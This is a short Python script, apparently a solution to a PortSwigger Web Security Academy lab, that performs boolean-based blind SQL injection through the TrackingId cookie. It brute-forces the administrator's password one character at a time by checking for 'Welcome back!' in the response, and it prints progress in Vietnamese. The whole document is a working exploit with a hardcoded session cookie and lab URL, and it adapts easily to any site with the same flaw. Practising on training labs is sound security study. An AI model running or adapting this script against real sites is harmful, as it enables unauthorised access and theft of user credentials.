#!/usr/bin/python3

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
passwd = ''
URL = 'https://0a3a004d032870e8831f06f4003600d6.web-security-academy.net'
TrackingID = "NthumwCeC7jI1LuK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1) =  '{character}'-- a"

for i in range (1,21):
	for c in chars:
		print("Vị trí ", i, " Ký tự ", c, end='\r')
		cookie = { 'session':'HNlL3nFoPSH9ryqDMeXfdmOgLW9Tzr58', 'TrackingId':TrackingID.format(index=i, character=c) }
		r = requests.get(URL, cookies=cookie)
		if "Welcome back!" in r.text:
			passwd += c
			break;
	print('\n')
	print("PASS: ", passwd)

